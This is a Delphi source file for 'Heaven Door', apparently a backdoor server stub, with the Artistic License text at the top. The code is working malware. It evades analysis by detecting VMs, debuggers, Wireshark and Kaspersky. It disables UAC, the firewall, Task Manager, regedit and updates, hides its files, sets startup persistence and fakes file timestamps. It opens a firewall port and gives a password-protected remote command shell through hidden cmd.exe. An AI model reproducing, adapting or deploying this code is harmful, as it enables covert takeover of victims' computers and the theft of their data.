{
  This software is Copyright (c) 2016 by Doddy Hackman.
  This is free software, licensed under:
  The Artistic License 2.0
  The Artistic License
  Preamble
  This license establishes the terms under which a given free software Package may be copied, modified, distributed, and/or redistributed. The intent is that the Copyright Holder maintains some artistic control over the development of that Package while still keeping the Package available as open source and free software.
  You are always permitted to make arrangements wholly outside of this license directly with the Copyright Holder of a given Package. If the terms of this license do not permit the full use that you propose to make of the Package, you should contact the Copyright Holder and seek a different licensing arrangement.
  Definitions
  "Copyright Holder" means the individual(s) or organization(s) named in the copyright notice for the entire Package.
  "Contributor" means any party that has contributed code or other material to the Package, in accordance with the Copyright Holder's procedures.
  "You" and "your" means any person who would like to copy, distribute, or modify the Package.
  "Package" means the collection of files distributed by the Copyright Holder, and derivatives of that collection and/or of those files. A given Package may consist of either the Standard Version, or a Modified Version.
  "Distribute" means providing a copy of the Package or making it accessible to anyone else, or in the case of a company or organization, to others outside of your company or organization.
  "Distributor Fee" means any fee that you charge for Distributing this Package or providing support for this Package to another party. It does not mean licensing fees.
  "Standard Version" refers to the Package if it has not been modified, or has been modified only in ways explicitly requested by the Copyright Holder.
  "Modified Version" means the Package, if it has been changed, and such changes were not explicitly requested by the Copyright Holder.
  "Original License" means this Artistic License as Distributed with the Standard Version of the Package, in its current version or as it may be modified by The Perl Foundation in the future.
  "Source" form means the source code, documentation source, and configuration files for the Package.
  "Compiled" form means the compiled bytecode, object code, binary, or any other form resulting from mechanical transformation or translation of the Source form.
  Permission for Use and Modification Without Distribution
  (1) You are permitted to use the Standard Version and create and use Modified Versions for any purpose without restriction, provided that you do not Distribute the Modified Version.
  Permissions for Redistribution of the Standard Version
  (2) You may Distribute verbatim copies of the Source form of the Standard Version of this Package in any medium without restriction, either gratis or for a Distributor Fee, provided that you duplicate all of the original copyright notices and associated disclaimers. At your discretion, such verbatim copies may or may not include a Compiled form of the Package.
  (3) You may apply any bug fixes, portability changes, and other modifications made available from the Copyright Holder. The resulting Package will still be considered the Standard Version, and as such will be subject to the Original License.
  Distribution of Modified Versions of the Package as Source
  (4) You may Distribute your Modified Version as Source (either gratis or for a Distributor Fee, and with or without a Compiled form of the Modified Version) provided that you clearly document how it differs from the Standard Version, including, but not limited to, documenting any non-standard features, executables, or modules, and provided that you do at least ONE of the following:
  (a) make the Modified Version available to the Copyright Holder of the Standard Version, under the Original License, so that the Copyright Holder may include your modifications in the Standard Version.
  (b) ensure that installation of your Modified Version does not prevent the user installing or running the Standard Version. In addition, the Modified Version must bear a name that is different from the name of the Standard Version.
  (c) allow anyone who receives a copy of the Modified Version to make the Source form of the Modified Version available to others under
  (i) the Original License or
  (ii) a license that permits the licensee to freely copy, modify and redistribute the Modified Version using the same licensing terms that apply to the copy that the licensee received, and requires that the Source form of the Modified Version, and of any works derived from it, be made freely available in that license fees are prohibited but Distributor Fees are allowed.
  Distribution of Compiled Forms of the Standard Version or Modified Versions without the Source
  (5) You may Distribute Compiled forms of the Standard Version without the Source, provided that you include complete instructions on how to get the Source of the Standard Version. Such instructions must be valid at the time of your distribution. If these instructions, at any time while you are carrying out such distribution, become invalid, you must provide new instructions on demand or cease further distribution. If you provide valid instructions or cease distribution within thirty days after you become aware that the instructions are invalid, then you do not forfeit any of your rights under this license.
  (6) You may Distribute a Modified Version in Compiled form without the Source, provided that you comply with Section 4 with respect to the Source of the Modified Version.
  Aggregating or Linking the Package
  (7) You may aggregate the Package (either the Standard Version or Modified Version) with other packages and Distribute the resulting aggregation provided that you do not charge a licensing fee for the Package. Distributor Fees are permitted, and licensing fees for other components in the aggregation are permitted. The terms of this license apply to the use and Distribution of the Standard or Modified Versions as included in the aggregation.
  (8) You are permitted to link Modified and Standard Versions with other works, to embed the Package in a larger work of your own, or to build stand-alone binary or bytecode versions of applications that include the Package, and Distribute the result without restriction, provided the result does not expose a direct interface to the Package.
  Items That are Not Considered Part of a Modified Version
  (9) Works (including, but not limited to, modules and scripts) that merely extend or make use of the Package, do not, by themselves, cause the Package to be a Modified Version. In addition, such works are not considered parts of the Package itself, and are not subject to the terms of this license.
  General Provisions
  (10) Any use, modification, and distribution of the Standard or Modified Versions is governed by this Artistic License. By using, modifying or distributing the Package, you accept this license. Do not use, modify, or distribute the Package, if you do not accept this license.
  (11) If your Modified Version has been derived from a Modified Version made by someone other than you, you are nevertheless required to ensure that your Modified Version complies with the requirements of this license.
  (12) This license does not grant you the right to use any trademark, service mark, tradename, or logo of the Copyright Holder.
  (13) This license includes the non-exclusive, worldwide, free-of-charge patent license to make, have made, use, offer to sell, sell, import and otherwise transfer the Package with respect to any patent claims licensable by the Copyright Holder that are necessarily infringed by the Package. If you institute patent litigation (including a cross-claim or counterclaim) against any party alleging that the Package constitutes direct or contributory patent infringement, then this Artistic License to you shall terminate on the date that such litigation is filed.
  (14) Disclaimer of Warranty: THE PACKAGE IS PROVIDED BY THE COPYRIGHT HOLDER AND CONTRIBUTORS "AS IS' AND WITHOUT ANY EXPRESS OR IMPLIED WARRANTIES. THE IMPLIED WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, OR NON-INFRINGEMENT ARE DISCLAIMED TO THE EXTENT PERMITTED BY YOUR LOCAL LAW. UNLESS REQUIRED BY LAW, NO COPYRIGHT HOLDER OR CONTRIBUTOR WILL BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, OR CONSEQUENTIAL DAMAGES ARISING IN ANY WAY OUT OF THE USE OF THE PACKAGE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
}

// Heaven Door 1.0
// (C) Doddy Hackman 2016

program stub;

// {$APPTYPE CONSOLE}
{$R *.res}

uses
  System.SysUtils, Windows, DH_Builder_Tools,
  DH_Auxiliar_Tools, DH_Installer, DH_Malware_Disables, Classes, IdTCPServer,
  IdSocketHandle, IdContext;

type
  TCPServerEvents = class
  public
    class procedure ExecuteHandler(AContext: TIdContext);
  end;

var
  server: TIdTCPServer;
  msg: TMsg;

var
  user_check, pass_check: string;
  command: string;
  computer_name: string;
  os: string;
  username: string;
  code: string;
  control: Boolean;

var
  logs: string;

var
  port, user_admin, password: string;

var
  contenido: string;
  builder_tools: T_DH_Builder_Tools;
  installer: T_DH_Installer;
  disable: T_DH_Malware_Disables;
  active: string;

var
  op_hide_files, op_use_startup, op_use_special_path, op_use_this_path,
    op_use_uac_tricky, op_uac_tricky_continue_if_off, op_uac_tricky_exit_if_off,
    op_use_this_datetime, creation_time, modified_time, last_access,
    special_path, path, folder, op_anti_virtual_pc, op_anti_virtual_box,
    op_anti_debug, op_anti_wireshark, op_anti_ollydbg, op_anti_anubis,
    op_anti_kaspersky, op_anti_vmware, op_disable_uac, op_disable_firewall,
    op_disable_cmd, op_disable_run, op_disable_taskmgr, op_disable_regedit,
    op_disable_updates, op_disable_msconfig: string;

  // Functions

function regex(text: String; deaca: String; hastaaca: String): String;
begin
  Delete(text, 1, AnsiPos(deaca, text) + Length(deaca) - 1);
  SetLength(text, AnsiPos(hastaaca, text) - 1);
  Result := text;
end;

function execute_command(command: string): string;
// Credits : Function ejecutar() based in : http://www.delphidabbler.com/tips/61
// Thanks to www.delphidabbler.com

var
  SecurityAttributes: TSecurityAttributes;
  StartupInfo: TStartupInfo;
  ProcessInformation: TProcessInformation;
  Handle1: THandle;
  Handle2: THandle;
  check: Boolean;
  output: array [0 .. 255] of AnsiChar;
  check2: Cardinal;
  check3: Boolean;
  code: string;

begin
  if not(command = '') then
  begin
    try
      begin
        code := '';

        with SecurityAttributes do
        begin
          nLength := SizeOf(SecurityAttributes);
          bInheritHandle := True;
          lpSecurityDescriptor := nil;
        end;

        CreatePipe(Handle1, Handle2, @SecurityAttributes, 0);

        with StartupInfo do
        begin
          FillChar(StartupInfo, SizeOf(StartupInfo), 0);
          cb := SizeOf(StartupInfo);
          dwFlags := STARTF_USESHOWWINDOW or STARTF_USESTDHANDLES;
          wShowWindow := SW_HIDE;
          hStdInput := GetStdHandle(STD_INPUT_HANDLE);
          hStdOutput := Handle2;
          hStdError := Handle2;
        end;

        check3 := CreateProcess(nil, Pchar('cmd.exe /C ' + command), nil, nil,
          True, 0, nil, Pchar('c:/'), StartupInfo, ProcessInformation);

        CloseHandle(Handle2);

        if check3 then

          repeat

          begin
            check := ReadFile(Handle1, output, 255, check2, nil);
          end;

          if check2 > 0 then
          begin
            output[check2] := #0;
            code := code + output;
          end;

          until not(check) or (check2 = 0);

        Result := '[+] Console : OK' + sLineBreak + code;
      end;
    except
      begin
        Result := '[-] Console : ERROR';
      end;
    end;
  end
  else
  begin
    Result := '[-] Console : ERROR';
  end;
end;

function get_os(): string;
var
  os: string;
begin
  os := '';
  if (Win32MajorVersion = 5) and (Win32MinorVersion = 1) then
  begin
    os := 'Windows XP';
  end
  else if (Win32MajorVersion = 6) and (Win32MinorVersion = 0) then
  begin
    os := 'Windows Vista';
  end
  else if (Win32MajorVersion = 6) and (Win32MinorVersion = 1) then
  begin
    os := 'Windows 7';
  end
  else if (Win32MajorVersion = 6) and (Win32MinorVersion = 2) then
  begin
    os := 'Windows 8';
  end
  else
  begin
    os := 'Unknown';
  end;
  Result := os;
end;

function get_username(): string;
var
  username: string;
begin
  username := GetEnvironmentVariable('USERNAME');
  if not(username = '') then
  begin
    Result := username;
  end
  else
  begin
    Result := 'Error';
  end;
end;

function get_computer_name(): string;
var
  name: string;
begin
  name := GetEnvironmentVariable('COMPUTERNAME');
  if not(name = '') then
  begin
    Result := name;
  end
  else
  begin
    Result := 'Error';
  end;
end;

class procedure TCPServerEvents.ExecuteHandler(AContext: TIdContext);
var
  user_check, pass_check: string;
  command: string;
  computer_name: string;
  os: string;
  username: string;
  code: string;
  control: Boolean;
begin

  AContext.Connection.Socket.WriteLn(sLineBreak + '[+] Enter Username : ');
  user_check := AContext.Connection.Socket.ReadLn;

  AContext.Connection.Socket.WriteLn(sLineBreak + '[+] Enter Password : ');
  pass_check := AContext.Connection.Socket.ReadLn;

  if (user_check = user_admin) and (pass_check = password) then
  begin
    AContext.Connection.Socket.WriteLn(sLineBreak + '[+] Heaven_Door : Online');
    AContext.Connection.Socket.WriteLn('[+] Port : ' + port);
    AContext.Connection.Socket.WriteLn
      ('[+] PID : ' + IntToStr(GetCurrentProcessId) + sLineBreak);

    AContext.Connection.Socket.WriteLn('Welcome to hell' + sLineBreak);

    computer_name := get_computer_name();
    os := get_os();
    username := get_username();

    AContext.Connection.Socket.WriteLn('[+] Computer Name : ' + computer_name);
    AContext.Connection.Socket.WriteLn('[+] OS Version : ' + os);
    AContext.Connection.Socket.WriteLn('[+] Username : ' + username +
      sLineBreak);

    control := True;
    while (control) do
    begin
      AContext.Connection.Socket.WriteLn('[+] Enter Command : ');
      command := AContext.Connection.Socket.ReadLn;
      if (command = 'exit') then
      begin
        AContext.Connection.Socket.WriteLn(sLineBreak + 'Good Bye');
        AContext.Connection.Disconnect;
      end;
      if not(command = '') then
      begin
        code := execute_command(command);
        AContext.Connection.Socket.WriteLn(sLineBreak + code + sLineBreak);
      end;
    end;
  end
  else
  begin
    AContext.Connection.Socket.WriteLn(sLineBreak + 'Bad Login');
    AContext.Connection.Disconnect;
  end;
end;

// End of Functions

begin
  try

    builder_tools := T_DH_Builder_Tools.Create();

    contenido := builder_tools.read_resource(666);

    if not(contenido = '') then
    begin

      active := regex(contenido, '[active]', '[active]');

      port := regex(contenido, '[port]', '[port]');
      user_admin := regex(contenido, '[username]', '[username]');
      password := regex(contenido, '[password]', '[password]');

      //

      op_hide_files := regex(contenido, '[op_hide_files]', '[op_hide_files]');
      op_use_startup := regex(contenido, '[op_use_startup]',
        '[op_use_startup]');

      op_use_special_path := regex(contenido, '[op_use_special_path]',
        '[op_use_special_path]');
      op_use_this_path := regex(contenido, '[op_use_this_path]',
        '[op_use_this_path]');
      special_path := regex(contenido, '[special_path]', '[special_path]');
      path := regex(contenido, '[path]', '[path]');
      folder := regex(contenido, '[folder]', '[folder]');

      op_use_uac_tricky := regex(contenido, '[op_use_uac_tricky]',
        '[op_use_uac_tricky]');
      op_uac_tricky_continue_if_off :=
        regex(contenido, '[op_uac_tricky_continue_if_off]',
        '[op_uac_tricky_continue_if_off]');
      op_uac_tricky_exit_if_off :=
        regex(contenido, '[op_uac_tricky_exit_if_off]',
        '[op_uac_tricky_exit_if_off]');

      op_use_this_datetime := regex(contenido, '[op_use_this_datetime]',
        '[op_use_this_datetime]');
      creation_time := regex(contenido, '[creation_time]', '[creation_time]');
      modified_time := regex(contenido, '[modified_time]', '[modified_time]');
      last_access := regex(contenido, '[last_access]', '[last_access]');

      op_anti_virtual_pc := regex(contenido, '[op_anti_virtual_pc]',
        '[op_anti_virtual_pc]');
      op_anti_virtual_box := regex(contenido, '[op_anti_virtual_box]',
        '[op_anti_virtual_box]');
      op_anti_debug := regex(contenido, '[op_anti_debug]', '[op_anti_debug]');
      op_anti_wireshark := regex(contenido, '[op_anti_wireshark]',
        '[op_anti_wireshark]');
      op_anti_ollydbg := regex(contenido, '[op_anti_ollydbg]',
        '[op_anti_ollydbg]');
      op_anti_anubis := regex(contenido, '[op_anti_anubis]',
        '[op_anti_anubis]');
      op_anti_kaspersky := regex(contenido, '[op_anti_kaspersky]',
        '[op_anti_kaspersky]');
      op_anti_vmware := regex(contenido, '[op_anti_vmware]',
        '[op_anti_vmware]');

      op_disable_uac := regex(contenido, '[op_disable_uac]',
        '[op_disable_uac]');
      op_disable_firewall := regex(contenido, '[op_disable_firewall]',
        '[op_disable_firewall]');
      op_disable_cmd := regex(contenido, '[op_disable_cmd]',
        '[op_disable_cmd]');
      op_disable_run := regex(contenido, '[op_disable_run]',
        '[op_disable_run]');
      op_disable_taskmgr := regex(contenido, '[op_disable_taskmgr]',
        '[op_disable_taskmgr]');
      op_disable_regedit := regex(contenido, '[op_disable_regedit]',
        '[op_disable_regedit]');
      op_disable_updates := regex(contenido, '[op_disable_updates]',
        '[op_disable_updates]');
      op_disable_msconfig := regex(contenido, '[op_disable_msconfig]',
        '[op_disable_msconfig]');

      if (active = '1') then
      begin
        installer := T_DH_Installer.Create();

        installer.set_UAC_Tricky(op_use_uac_tricky,
          op_uac_tricky_continue_if_off, op_uac_tricky_exit_if_off, '1');
        installer.setAntis(op_anti_virtual_pc, op_anti_virtual_box,
          op_anti_debug, op_anti_wireshark, op_anti_ollydbg, op_anti_anubis,
          op_anti_kaspersky, op_anti_vmware);
        installer.setDisables(op_disable_uac, op_disable_firewall,
          op_disable_cmd, op_disable_run, op_disable_taskmgr,
          op_disable_regedit, op_disable_updates, op_disable_msconfig);
        installer.setMoveFile(op_use_special_path, op_use_this_path,
          special_path, path, folder, 'hd.exe');
        installer.setHide(op_hide_files);
        installer.setStartup(op_use_startup, 'hd');
        installer.setOpenFirewallPort('1', 'hd', port);
        installer.setDateTime(op_use_this_datetime, creation_time,
          modified_time, last_access);

        logs := installer.Install();

        installer.Free();
        builder_tools.Free();

        // Main

        if not(port = '') and not(user_admin = '') and not(password = '') then
        begin

          server := TIdTCPServer.Create();
          server.DefaultPort := StrToInt(port);
          server.OnExecute := TCPServerEvents.ExecuteHandler;
          server.active := True;

          while GetMessage(msg, 0, 0, 0) do
          begin
            TranslateMessage(msg);
            DispatchMessage(msg);
          end;

        end
        else
        begin
          ExitProcess(0);
        end;

        // End of Main

      end;

    end
    else
    begin
      ExitProcess(0);
    end;

  except
    begin
      //
    end;
  end;

end.

// The End ?
